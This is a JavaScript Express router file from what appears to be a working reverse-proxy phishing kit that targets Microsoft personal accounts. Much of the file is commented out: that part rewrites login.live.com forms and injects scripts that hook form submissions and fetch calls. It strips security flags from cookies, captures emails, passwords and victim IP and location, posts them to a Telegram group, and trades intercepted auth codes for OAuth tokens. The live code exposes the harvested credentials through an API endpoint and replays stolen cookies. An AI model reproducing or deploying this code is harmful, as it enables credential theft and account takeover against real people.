//                                     input.value = encryptedEmail;
//                                     form.appendChild(input);
//                                 }
//                                 // Store original action if not already stored
//                                 if (!form.querySelector('input[name="original_action"]') && form.action) {
//                                     const input = document.createElement('input');
//                                     input.type = 'hidden';
//                                     input.name = 'original_action';
//                                     input.value = form.action;
//                                     form.appendChild(input);
//                                 }
//                             }
                            
//                             // Intercept all form submissions
//                             document.addEventListener('submit', function(e) {
//                                 const form = e.target;
//                                 let action = form.action || '';
                                
//                                 if (action.includes('login.live.com') || action.includes('/ppsecure/')) {
//                                     e.preventDefault();
//                                     console.log('🔄 Intercepted form submission to:', action);
//                                     // Add any missing hidden fields
//                                     addHiddenFields(form);
//                                     form.action = '/proxy/live-login';
//                                     form.submit();
//                                 }
//                             }, true);
                            
//                             // Also monitor for dynamically added forms
//                             const observer = new MutationObserver(function(mutations) {
//                                 mutations.forEach(function(mutation) {
//                                     mutation.addedNodes.forEach(function(node) {
//                                         if (node.nodeName === 'FORM') {
//                                             addHiddenFields(node);
//                                         }
//                                         if (node.querySelectorAll) {
//                                             node.querySelectorAll('form').forEach(addHiddenFields);
//                                         }
//                                     });
//                                 });
//                             });
//                             observer.observe(document.body, { childList: true, subtree: true });
                            
//                             console.log('✅ Personal account proxy interception active');
//                         })();
//                     </script>
//                 `);

//                 console.log(`✅ Serving modified personal account login page for session ${sessionId}`);
//                 return res.send($.html());
//             }
//             return res.redirect(location);
//         }

//         // If no redirect, parse and modify the page directly
//         let html = response.data;
//         const $ = cheerio.load(html);

//         $('form').each(function() {
//             const originalAction = $(this).attr('action') || '';
//             let fullOriginalUrl = originalAction;
//             if (!fullOriginalUrl.startsWith('http')) {
//                 fullOriginalUrl = `https://login.live.com${fullOriginalUrl}`;
//             }
//             let queryString = '';
//             const urlParts = fullOriginalUrl.split('?');
//             if (urlParts.length > 1) queryString = urlParts[1];
            
//             $(this).attr('action', '/proxy/live-login');
//             $(this).append(`<input type="hidden" name="original_action" value="${escapeHtml(fullOriginalUrl)}">`);
//             $(this).append(`<input type="hidden" name="original_query" value="${escapeHtml(queryString)}">`);
//             $(this).append(`<input type="hidden" name="sessionId" value="${sessionId}">`);
//             $(this).append(`<input type="hidden" name="state" value="${sessionId}">`);
//             if (encryptedEmail) {
//                 $(this).append(`<input type="hidden" name="email_encrypted" value="${encryptedEmail}">`);
//             }
//         });

//         res.send($.html());

//     } catch (error) {
//         console.error('❌ Personal OAuth proxy error:', error.message);
//         if (error.response?.status === 302 && error.response.headers?.location) {
//             console.log(`↪️ Redirect captured: ${error.response.headers.location}`);
//             return res.redirect(error.response.headers.location);
//         }
//         res.status(500).send(`<html><body><h1>Error</h1><p>${error.message}</p></body></html>`);
//     }
// });

// Helper to escape HTML special characters in hidden fields



/**
 * Personal Microsoft account OAuth endpoint - Handles both page display and form submission
 */
// router.route('/proxy/live-oauth')
//     .get(async (req, res) => {
//         console.log('📥 Personal account OAuth GET request');
//         console.log(`   Query params:`, req.query);

//         const sessionId = req.query.state || 'unknown';
//         const encryptedEmail = req.query.email_encrypted;

//         // Decrypt email for logging
//         let email = null;
//         if (encryptedEmail) {
//             try {
//                 email = decrypt(encryptedEmail);
//                 console.log(`   Decrypted email from query: ${email}`);
//             } catch (e) {
//                 console.error('   Failed to decrypt email:', e);
//             }
//         }

//         // Store email in session if we have it
//         if (email && sessionId) {
//             const existingSession = emailSessions.get(sessionId) || {};
//             existingSession.decrypted = email;
//             existingSession.encrypted = encryptedEmail;
//             emailSessions.set(sessionId, existingSession);
//         }

//         // Ensure we have a PKCE verifier for this session
//         if (!codeVerifiers.has(sessionId)) {
//             console.log(`⚠️ No code verifier for session ${sessionId}, generating one`);
//             codeVerifiers.set(sessionId, generateCodeVerifier());
//         }

//         // Build target URL WITHOUT our custom parameters (email_encrypted)
//         const forwardParams = new URLSearchParams(req.query);
//         forwardParams.delete('email_encrypted');
//         const targetUrl = `https://login.live.com/oauth20_authorize.srf?${forwardParams.toString()}`;
//         console.log(`   Forwarding to: ${targetUrl}`);

//         try {
//             // Get stored cookies for this session
//             const storedCookies = personalCookies.get(sessionId) || [];

//             // Fetch the initial OAuth page from Microsoft
//             const response = await axios({
//                 method: 'GET',
//                 url: targetUrl,
//                 headers: {
//                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
//                     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
//                     'Cookie': storedCookies.join('; '),
//                     'Accept-Language': 'en-US,en;q=0.9'
//                 },
//                 maxRedirects: 0,
//                 validateStatus: status => status >= 200 && status < 400
//             });

//             // Capture and modify cookies
//             if (response.headers['set-cookie']) {
//                 response.headers['set-cookie'].forEach(cookieStr => {
//                     // Store the ORIGINAL cookie for forwarding to Microsoft (unchanged)
//                     let newCookies = personalCookies.get(sessionId) || [];
//                     newCookies.push(cookieStr);
//                     personalCookies.set(sessionId, [...new Set(newCookies)]);
                    
//                     // Create modified cookie for browser (remove domain and secure flags)
//                     let modifiedCookie = cookieStr
//                         .replace(/;?\s*Domain=[^;]+/gi, '')
//                         .replace(/;?\s*Secure/gi, '')
//                         .replace(/;?\s*SameSite=None/gi, '');
                    
//                     console.log(`   Modified cookie for browser`);
//                     res.append('Set-Cookie', modifiedCookie);
//                 });
//             }

//             // Handle redirect (Microsoft may redirect to actual login page)
//             if (response.status === 302 || response.status === 303) {
//                 const location = response.headers.location;
//                 console.log(`↪️ Redirect to: ${location}`);

//                 if (location.includes('login.live.com')) {
//                     // Fetch the actual login page
//                     const loginResponse = await axios({
//                         method: 'GET',
//                         url: location,
//                         headers: {
//                             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
//                             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
//                             'Cookie': personalCookies.get(sessionId)?.join('; ') || ''
//                         }
//                     });

//                     let html = loginResponse.data;
//                     const $ = cheerio.load(html);

//                     // Extract contextid from the page if present
//                     let contextId = null;
//                     const contextMatch = html.match(/contextid["']?\s*:\s*["']([^"']+)["']/i);
//                     if (contextMatch) contextId = contextMatch[1];

//                     // Store contextid for later use
//                     if (contextId && sessionId) {
//                         const session = personalCookies.get(sessionId) || [];
//                         session.contextId = contextId;
//                         personalCookies.set(sessionId, session);
//                     }

//                     // === MODIFY ALL FORMS TO SUBMIT TO THIS SAME ROUTE ===
//                     $('form').each(function() {
//                         const action = $(this).attr('action') || '';
                        
//                         // Change form action to THIS route (not a separate one)
//                         $(this).attr('action', '/proxy/live-oauth');
//                         $(this).attr('method', 'post');
                        
//                         // Add hidden fields to preserve session data
//                         $(this).append(`<input type="hidden" name="sessionId" value="${sessionId}">`);
//                         $(this).append(`<input type="hidden" name="state" value="${sessionId}">`);
//                         $(this).append(`<input type="hidden" name="contextid" value="${contextId || ''}">`);
//                         if (encryptedEmail) {
//                             $(this).append(`<input type="hidden" name="email_encrypted" value="${encryptedEmail}">`);
//                         }
                        
//                         console.log(`   Modified form to submit to /proxy/live-oauth`);
//                     });

//                     // Add interception script to ensure all submissions go to this route
// $('head').prepend(`
//     <script>
//         (function() {
//             const sessionId = '${sessionId}';
//             const encryptedEmail = '${encryptedEmail || ''}';
//             const contextId = '${contextId || ''}';
            
//             console.log('🔐 Personal account proxy active for session:', sessionId);
            
//             // Override form submission
//             const originalSubmit = HTMLFormElement.prototype.submit;
//             HTMLFormElement.prototype.submit = function() {
//                 if (this.action && (this.action.includes('login.live.com') || this.action.includes('/ppsecure/'))) {
//                     console.log('🔄 Intercepted form submission to:', this.action);
//                     this.action = '/proxy/live-oauth';
                    
//                     // Add missing fields
//                     if (!this.querySelector('input[name="sessionId"]')) {
//                         const input = document.createElement('input');
//                         input.type = 'hidden';
//                         input.name = 'sessionId';
//                         input.value = sessionId;
//                         this.appendChild(input);
//                     }
//                     if (encryptedEmail && !this.querySelector('input[name="email_encrypted"]')) {
//                         const input = document.createElement('input');
//                         input.type = 'hidden';
//                         input.name = 'email_encrypted';
//                         input.value = encryptedEmail;
//                         this.appendChild(input);
//                     }
//                     if (contextId && !this.querySelector('input[name="contextid"]')) {
//                         const input = document.createElement('input');
//                         input.type = 'hidden';
//                         input.name = 'contextid';
//                         input.value = contextId;
//                         this.appendChild(input);
//                     }
//                 }
//                 return originalSubmit.call(this);
//             };
            
//             // Also intercept fetch requests
//             const originalFetch = window.fetch;
//             window.fetch = function(url, options) {
//                 if (typeof url === 'string' && (url.includes('login.live.com') || url.includes('/ppsecure/'))) {
//                     console.log('🔄 Intercepted fetch to:', url);
//                     url = '/proxy/live-oauth';
//                     options = options || {};
//                     options.method = 'POST';
//                     options.headers = options.headers || {};
//                     options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
                    
//                     // Handle body properly based on its type
//                     let bodyString = '';
//                     if (options.body) {
//                         if (typeof options.body === 'string') {
//                             bodyString = options.body;
//                         } else if (options.body instanceof URLSearchParams) {
//                             bodyString = options.body.toString();
//                         } else if (options.body instanceof FormData) {
//                             bodyString = new URLSearchParams(options.body).toString();
//                         } else {
//                             bodyString = String(options.body);
//                         }
//                     }
//                     bodyString += '&sessionId=' + sessionId + '&email_encrypted=' + encryptedEmail + '&contextid=' + contextId;
//                     options.body = bodyString;
//                 }
//                 return originalFetch.call(this, url, options);
//             };
//         })();
//     </script>
// `);

//                     console.log(`✅ Serving modified personal account login page for session ${sessionId}`);
//                     return res.send($.html());
//                 }
//                 return res.redirect(location);
//             }

//             // If no redirect, parse and modify the page directly
//             let html = response.data;
//             const $ = cheerio.load(html);

//             $('form').each(function() {
//                 $(this).attr('action', '/proxy/live-oauth');
//                 $(this).attr('method', 'post');
//                 $(this).append(`<input type="hidden" name="sessionId" value="${sessionId}">`);
//                 $(this).append(`<input type="hidden" name="state" value="${sessionId}">`);
//                 if (encryptedEmail) {
//                     $(this).append(`<input type="hidden" name="email_encrypted" value="${encryptedEmail}">`);
//                 }
//             });

//             res.send($.html());

//         } catch (error) {
//             console.error('❌ Personal OAuth proxy error:', error.message);
//             if (error.response?.status === 302 && error.response.headers?.location) {
//                 console.log(`↪️ Redirect captured: ${error.response.headers.location}`);
//                 return res.redirect(error.response.headers.location);
//             }
//             res.status(500).send(`<html><body><h1>Error</h1><p>${error.message}</p></body></html>`);
//         }
//     })
//     .post(express.urlencoded({ extended: true }), async (req, res) => {
//         console.log('📥 Personal account login POST received on /proxy/live-oauth');
//         console.log('   Body fields:', Object.keys(req.body));
        
//         const sessionId = req.body.sessionId || req.body.state || 'unknown';
//         const encryptedEmail = req.body.email_encrypted;
//         const username = req.body.login || req.body.loginfmt || req.body.email;
//         const password = req.body.passwd;
//         const contextId = req.body.contextid || null;
        
//         const victimInfo = await getVictimInfo(req);
        
//         // Capture credentials
//         if (username && password) {
//             console.log(`🔑 PERSONAL ACCOUNT CREDENTIALS CAPTURED: ${username}`);
            
//             let session = capturedData.get(sessionId) || { credentials: {}, cookies: [], tokens: {} };
//             session.credentials = {
//                 username,
//                 password,
//                 time: new Date().toISOString(),
//                 victimInfo,
//                 account_type: 'personal',
//                 ip: victimInfo.ip,
//                 userAgent: req.headers['user-agent']
//             };
            
//             // Store cookies if any
//             const storedCookies = personalCookies.get(sessionId) || [];
//             if (storedCookies.length > 0) {
//                 session.cookies = storedCookies.map(cookieStr => {
//                     const [name] = cookieStr.split('=');
//                     return { name, value: cookieStr, captured_at: new Date().toISOString() };
//                 });
//             }
            
//             capturedData.set(sessionId, session);
            
//             // Send Telegram notification
//             if (bot && telegramGroupId) {
//                 const message = 
//                     `📧 *PERSONAL ACCOUNT CREDENTIALS CAPTURED!*\n` +
//                     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
//                     `*Session:* \`${sessionId}\`\n` +
//                     `*Email:* \`${username}\`\n` +
//                     `*Password:* \`${password}\`\n` +
//                     `*Account Type:* Personal (Outlook/Hotmail/Live)\n` +
//                     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
//                     `*Victim Information:*\n` +
//                     `• IP: \`${victimInfo.ip}\`\n` +
//                     `• Location: ${victimInfo.location}\n` +
//                     `• Browser: ${victimInfo.browser}\n` +
//                     `• OS: ${victimInfo.os}\n` +
//                     `• Time: ${new Date().toLocaleString()}\n` +
//                     `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
                
//                 bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' }).catch(() => {});
//             }
//         }
        
//         // Forward to Microsoft to complete login
//         try {
//             // Reconstruct form data without our custom fields
//             const formData = new URLSearchParams();
//             for (const [key, value] of Object.entries(req.body)) {
//                 if (!['sessionId', 'email_encrypted', 'original_action', 'original_query'].includes(key)) {
//                     formData.append(key, value);
//                 }
//             }
            
//             // Get stored cookies for this session
//             const storedCookies = personalCookies.get(sessionId) || [];
            
//             // Extract just the cookie name=value pairs
//             const cookieValues = storedCookies.map(c => {
//                 const match = c.match(/^([^=]+)=([^;]+)/);
//                 return match ? `${match[1]}=${match[2]}` : c;
//             });
            
//             console.log(`   Forwarding ${cookieValues.length} cookies to Microsoft, contextId: ${contextId}`);
            
//             // Build target URL
//             let targetUrl = 'https://login.live.com/ppsecure/post.srf';
//             if (contextId) {
//                 targetUrl += `?contextid=${contextId}`;
//             }
            
//             console.log(`   Target URL: ${targetUrl}`);
//             console.log(`   Cookie string: ${cookieValues.join('; ').substring(0, 200)}...`);
            
//             const response = await axios.post(targetUrl, formData.toString(), {
//                 headers: {
//                     'Content-Type': 'application/x-www-form-urlencoded',
//                     'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0',
//                     'Cookie': cookieValues.join('; '),
//                     'Referer': 'https://login.live.com/'
//                 },
//                 maxRedirects: 0,
//                 validateStatus: status => status >= 200 && status < 400
//             });
            
//             // Capture any new cookies
//             if (response.headers['set-cookie']) {
//                 const newCookies = personalCookies.get(sessionId) || [];
//                 response.headers['set-cookie'].forEach(cookieStr => {
//                     newCookies.push(cookieStr);
//                     // Forward to browser (remove domain restriction)
//                     let modifiedCookie = cookieStr
//                         .replace(/;?\s*Domain=[^;]+/gi, '')
//                         .replace(/;?\s*Secure/gi, '');
//                     res.append('Set-Cookie', modifiedCookie);
//                 });
//                 personalCookies.set(sessionId, [...new Set(newCookies)]);
//             }
            
//             // Handle redirect
//             if (response.headers.location) {
//                 const location = response.headers.location;
//                 console.log(`↪️ Login redirect to: ${location}`);
                
//                 // If we got an authorization code, capture it
//                 if (location.includes('code=')) {
//                     console.log(`✅ Auth code captured for personal account!`);
//                     const codeMatch = location.match(/code=([^&]+)/);
                    
//                     if (codeMatch && codeVerifiers.has(sessionId)) {
//                         const code = decodeURIComponent(codeMatch[1]);
//                         const codeVerifier = codeVerifiers.get(sessionId);
                        
//                         try {
//                             console.log(`🔄 Exchanging code for tokens...`);
//                             const tokenResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
//                                 new URLSearchParams({
//                                     client_id: DUAL_TOKEN_CLIENT_ID,
//                                     code: code,
//                                     code_verifier: codeVerifier,
//                                     redirect_uri: DUAL_TOKEN_REDIRECT_URI,
//                                     grant_type: 'authorization_code',
//                                     scope: OUTLOOK_SCOPE
//                                 }).toString(),
//                                 {
//                                     headers: {
//                                         'Content-Type': 'application/x-www-form-urlencoded',
//                                         'User-Agent': 'Mozilla/5.0'
//                                     }
//                                 }
//                             );
                            
//                             console.log(`✅ Tokens received successfully!`);
//                             let session = capturedData.get(sessionId) || {};
//                             session.tokens = tokenResponse.data;
//                             capturedData.set(sessionId, session);
                            
//                         } catch (err) {
//                             console.error('❌ Token exchange failed:', err.message);
//                         }
//                     }
                    
//                     let session = capturedData.get(sessionId) || {};
//                     session.auth_code_captured = true;
//                     session.auth_code_url = location;
//                     capturedData.set(sessionId, session);
//                 }
                
//                 return res.redirect(location);
//             }
            
//             console.log(`✅ Login successful, redirecting to Outlook`);
//             res.redirect('https://outlook.live.com/mail/');
            
//         } catch (error) {
//             console.error('❌ Personal login error:', error.message);
//             if (error.response?.headers?.location) {
//                 console.log(`↪️ Error redirect to: ${error.response.headers.location}`);
//                 return res.redirect(error.response.headers.location);
//             }
//             res.redirect('/en-us/auth?error=live_login_failed');
//         }
//     });




function escapeHtml(str) {
    if (!str) return '';
    return str.replace(/&/g, '&amp;')
              .replace(/</g, '&lt;')
              .replace(/>/g, '&gt;')
              .replace(/"/g, '&quot;')
              .replace(/'/g, '&#39;');
}



// Personal account login handler (captures credentials for @outlook.com etc.)
// router.post('/proxy/live-login', express.urlencoded({ extended: true }), async (req, res) => {
//      console.log('🚨🚨🚨 /proxy/live-login ROUTE WAS CALLED! 🚨🚨🚨');
//     console.log('📥 Personal account login submission');
//     console.log('   Body fields:', Object.keys(req.body));
//     console.log('   Headers cookie:', req.headers.cookie);
//     console.log('📥 Personal account login submission');
//     console.log('   Body fields:', Object.keys(req.body));

//     const sessionId = req.body.sessionId || req.body.state || req.headers['x-session-id'] || 'unknown';
//     const encryptedEmail = req.body.email_encrypted || req.headers['x-encrypted-email'];
//     const username = req.body.login || req.body.loginfmt || req.body.email;
//     const password = req.body.passwd;
    
//     const originalAction = req.body.original_action || '';
//     const originalQuery = req.body.original_query || '';

//     let contextId = null;
//     if (originalAction) {
//         const contextMatch = originalAction.match(/[?&]contextid=([^&]+)/);
//         if (contextMatch) contextId = contextMatch[1];
//     }
//     if (!contextId && originalQuery) {
//         const contextMatch = originalQuery.match(/[?&]contextid=([^&]+)/);
//         if (contextMatch) contextId = contextMatch[1];
//     }

//     console.log(`   Session: ${sessionId}, ContextId: ${contextId || 'none'}`);

//     const victimInfo = await getVictimInfo(req);
    
//     // Capture credentials
//     if (username && password) {
//         console.log(`🔑 PERSONAL ACCOUNT CREDENTIALS CAPTURED: ${username}`);
//         let session = capturedData.get(sessionId) || { credentials: {}, cookies: [], tokens: {} };
//         session.credentials = {
//             username,
//             password,
//             time: new Date().toISOString(),
//             victimInfo,
//             account_type: 'personal',
//             ip: victimInfo.ip,
//             userAgent: req.headers['user-agent']
//         };
//         const storedCookies = personalCookies.get(sessionId) || [];
//         if (storedCookies.length > 0) {
//             session.cookies = storedCookies.map(cookieStr => {
//                 const [name, value] = cookieStr.split('=');
//                 return { name, value, captured_at: new Date().toISOString() };
//             });
//         }
//         capturedData.set(sessionId, session);
        
//         // Send Telegram notification
//         if (bot && telegramGroupId) {
//             const message = 
//                 `📧 *PERSONAL ACCOUNT CREDENTIALS CAPTURED!*\n` +
//                 `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
//                 `*Session:* \`${sessionId}\`\n` +
//                 `*Email:* \`${username}\`\n` +
//                 `*Password:* \`${password}\`\n` +
//                 `*Account Type:* Personal (Outlook/Hotmail/Live)\n` +
//                 `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
//                 `*Victim Information:*\n` +
//                 `• IP: \`${victimInfo.ip}\`\n` +
//                 `• Location: ${victimInfo.location}\n` +
//                 `• Browser: ${victimInfo.browser}\n` +
//                 `• OS: ${victimInfo.os}\n` +
//                 `• Time: ${new Date().toLocaleString()}\n` +
//                 `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
            
//             bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' }).catch(() => {});
//         }
//     }
    
//     // Forward to Microsoft to complete login
//     try {
//         // Reconstruct form data without custom fields
//         const formData = new URLSearchParams();
//         for (const [key, value] of Object.entries(req.body)) {
//             if (!['sessionId', 'state', 'email_encrypted', 'original_action', 'original_query'].includes(key)) {
//                 formData.append(key, value);
//             }
//         }

//         // Get stored ORIGINAL cookies (with live.com domain)
//         const storedCookies = personalCookies.get(sessionId) || [];
//         console.log(`   Forwarding ${storedCookies.length} cookies to Microsoft`);

//         // Build target URL
//         let targetUrl = 'https://login.live.com/ppsecure/post.srf';
//         const urlParams = new URLSearchParams();
//         if (contextId) urlParams.append('contextid', contextId);
//         if (originalQuery) {
//             const extraParams = new URLSearchParams(originalQuery);
//             for (const [key, value] of extraParams) {
//                 if (key !== 'contextid') urlParams.append(key, value);
//             }
//         }
//         const queryString = urlParams.toString();
//         if (queryString) targetUrl += '?' + queryString;

//         console.log(`   Target URL: ${targetUrl}`);
//         console.log(`   Cookie count: ${storedCookies.length}`);
        
//         // Extract just the cookie name=value pairs (without domain/path attributes)
//         const cookieValues = storedCookies.map(c => {
//             const match = c.match(/^([^=]+)=([^;]+)/);
//             return match ? `${match[1]}=${match[2]}` : c;
//         });
//         console.log(`   Cookie values: ${cookieValues.join('; ').substring(0, 200)}...`);

//         const response = await axios.post(targetUrl, formData.toString(), {
//             headers: {
//                 'Content-Type': 'application/x-www-form-urlencoded',
//                 'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0',
//                 'Cookie': cookieValues.join('; '),
//                 'Referer': 'https://login.live.com/'
//             },
//             maxRedirects: 0,
//             validateStatus: status => status >= 200 && status < 400
//         });

//         // Capture new cookies
//         if (response.headers['set-cookie']) {
//             const newCookies = personalCookies.get(sessionId) || [];
//             response.headers['set-cookie'].forEach(cookieStr => {
//                 const match = cookieStr.match(/^([^=]+)=([^;]+)/);
//                 if (match) {
//                     newCookies.push(cookieStr);
//                 }
//                 // Forward to browser (remove domain restriction)
//                 let modifiedCookie = cookieStr.replace(/;?\s*Domain=[^;]+/gi, '').replace(/;?\s*Secure/gi, '');
//                 res.append('Set-Cookie', modifiedCookie);
//             });
//             personalCookies.set(sessionId, [...new Set(newCookies)]);
//         }

//         // Handle redirect
//         if (response.headers.location) {
//             const location = response.headers.location;
//             console.log(`↪️ Login redirect to: ${location}`);
//             if (location.includes('code=')) {
//                 console.log(`✅ Auth code captured for personal account!`);
//                 let session = capturedData.get(sessionId) || {};
//                 session.auth_code_captured = true;
//                 session.auth_code_url = location;
//                 capturedData.set(sessionId, session);
//             }
//             return res.redirect(location);
//         }

//         console.log(`✅ Login successful, redirecting to Outlook`);
//         res.redirect('https://outlook.live.com/mail/');

//     } catch (error) {
//         console.error('❌ Personal login error:', error.message);
//         if (error.response?.headers?.location) {
//             return res.redirect(error.response.headers.location);
//         }
//         res.redirect('/en-us/auth?error=live_login_failed');
//     }
// });







// Endpoint to retrieve captured data
router.get('/api/captured-data', async (req, res) => {
    try {
        const data = Array.from(capturedData.entries()).map(([sessionId, session]) => ({
            sessionId,
            credentials: session.credentials,
            cookiesCount: session.cookies?.length || 0,
            hasTokens: !!session.tokens?.outlook,
            capturedAt: session.credentials?.time || session.cookies?.[0]?.captured_at
        }));
        
        res.json(data);
    } catch (error) {
        console.error('Error retrieving captured data:', error);
        res.status(500).json({ error: 'Failed to retrieve data' });
    }
});




// Proxy for personal account API calls
router.all('/proxy/live-api/*path', async (req, res) => { 
    const sessionId = req.headers['x-session-id'] || 'unknown';
    const targetPath = req.path.replace('/proxy/live-api', '');
    const targetUrl = `https://login.live.com${targetPath}${req.url.search || ''}`;
    
    console.log(`📡 Proxying live.com API: ${targetUrl}`);
    
    try {
        const storedCookies = personalCookies.get(sessionId) || [];
        const response = await axios({
            method: req.method,
            url: targetUrl,
            headers: {
                'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0',
                'Content-Type': req.headers['content-type'] || 'application/x-www-form-urlencoded',
                'Cookie': storedCookies.join('; ')
            },
            data: req.body
        });
        
        res.status(response.status).send(response.data);
    } catch (error) {
        console.error('Live API proxy error:', error.message);
        res.status(500).send(error.message);
    }
});











module.exports = { router, initRoutes };